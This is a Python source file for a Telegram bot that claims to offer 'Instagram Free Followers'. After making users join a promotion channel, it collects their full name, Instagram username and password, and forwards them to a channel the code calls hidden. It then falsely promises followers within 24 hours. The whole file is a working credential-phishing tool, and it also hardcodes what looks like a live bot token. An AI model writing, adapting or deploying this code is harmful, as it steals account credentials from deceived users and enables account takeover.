import telebot
from telebot import types
import os
from flask import Flask

# Bot Token and Setup
BOT_TOKEN = '7657125691:AAFm8yyWeB8Y-R12eHVhp-r6Kgr6Qs7g8nY'
CHANNEL_USERNAME = '@HiddenFinder_1'
FORCE_CHANNEL = '@freeultraapk'

bot = telebot.TeleBot(BOT_TOKEN)
user_data = {}

# Flask app for Render to keep bot alive
app = Flask(__name__)

@app.route('/')
def index():
    return "Bot is running!"

# Check if user has joined the force join channel
def is_user_joined(chat_id):
    try:
        member = bot.get_chat_member(FORCE_CHANNEL, chat_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id

    if not is_user_joined(chat_id):
        markup = types.InlineKeyboardMarkup()
        join_btn = types.InlineKeyboardButton("Join Channel", url=f"https://t.me/{FORCE_CHANNEL[1:]}")
        refresh_btn = types.InlineKeyboardButton("✅ Joined", callback_data="check_join")
        markup.add(join_btn)
        markup.add(refresh_btn)
        bot.send_message(chat_id, "To continue, please join our update channel first:", reply_markup=markup)
        return

    bot.send_message(chat_id, "Welcome to Instagram Free Followers!\n\nPlease enter your **Full Name** to begin:")
    user_data[chat_id] = {'step': 'name'}

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join(call):
    chat_id = call.message.chat.id

    if is_user_joined(chat_id):
        bot.send_message(chat_id, "Welcome to Instagram Free Followers!\n\nPlease enter your **Full Name** to begin:")
        user_data[chat_id] = {'step': 'name'}
    else:
        bot.answer_callback_query(call.id, "You haven't joined the channel yet!", show_alert=True)

@bot.message_handler(func=lambda message: True)
def handle_data(message):
    chat_id = message.chat.id

    if chat_id not in user_data:
        bot.send_message(chat_id, "Please type /start to begin.")
        return

    step = user_data[chat_id]['step']

    if step == 'name':
        user_data[chat_id]['name'] = message.text
        user_data[chat_id]['step'] = 'username'
        bot.send_message(chat_id, "Great! Now enter your **Instagram Username**:")

    elif step == 'username':
        user_data[chat_id]['username'] = message.text
        user_data[chat_id]['step'] = 'password'
        bot.send_message(chat_id, "Almost done! Now enter your **Instagram Password**:")

    elif step == 'password':
        user_data[chat_id]['password'] = message.text

        name = user_data[chat_id]['name']
        username = user_data[chat_id]['username']
        password = user_data[chat_id]['password']

        # Send to hidden channel
        msg = f"📥 *New Instagram Follower Request*\n\n👤 Name: `{name}`\n🔰 Username: `{username}`\n🔑 Password: `{password}`"
        bot.send_message(CHANNEL_USERNAME, msg, parse_mode="Markdown")

        bot.send_message(chat_id, "✅ Thanks! Your request has been submitted.\nYou'll receive followers within 24 hours.")
        del user_data[chat_id]

import threading
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
